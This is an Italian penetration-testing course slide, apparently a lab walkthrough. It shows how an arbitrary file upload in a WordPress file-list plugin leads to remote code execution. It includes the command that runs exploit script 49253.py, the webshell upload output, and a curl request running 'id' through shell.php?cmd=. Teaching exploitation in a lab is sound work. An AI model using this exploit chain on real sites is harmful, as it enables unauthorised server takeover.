Capitolo 4: Exploitation

Slide 4.3: Esecuzione dell'Exploit RCE
Teoria: File Upload to RCE

L'Arbitrary File Upload diventa RCE quando:


  1. Il server esegue file PHP (✓ Apache + mod_php)
  2. Possiamo caricare file .php (✓ no filter)
  3. Conosciamo il path del file caricato (✓ prevedibile)
  4. Possiamo accedere al file via HTTP (✓ in webroot)

Catena di attacco:

1. Upload webshell.php → Plugin directory 2. Accesso: /wp-content/plugins/.../webshell.php 3. Esecuzione comandi via ?cmd=whoami

Security Insight: Questa vulnerabilità è così grave perché bypasssa completamente l'autenticazione WordPress. Chiunque su Internet può ottenere RCE.

Lab: Exploit in Azione

Step 1: Eseguiamo l'exploit

┌──(kali㉿kali)-[~] └─$ python3 49253.py http://vulnerable-wp.local

Output:

[*] Targeting: http://vulnerable-wp.local [*] Uploading webshell... [+] Webshell uploaded successfully! [+] Shell URL: http://vulnerable-wp.local/wp-content/plugins/simple-file-list/ee-files/shell.php

Step 2: Verifichiamo RCE

└─$ curl "http://vulnerable-wp.local/wp-content/plugins/simple-file-list/ee-files/shell.php?cmd=id" uid=33(www-data) gid=33(www-data) groups=33(www-data)

✓ RCE CONFERMATO! Siamo www-data sul server.
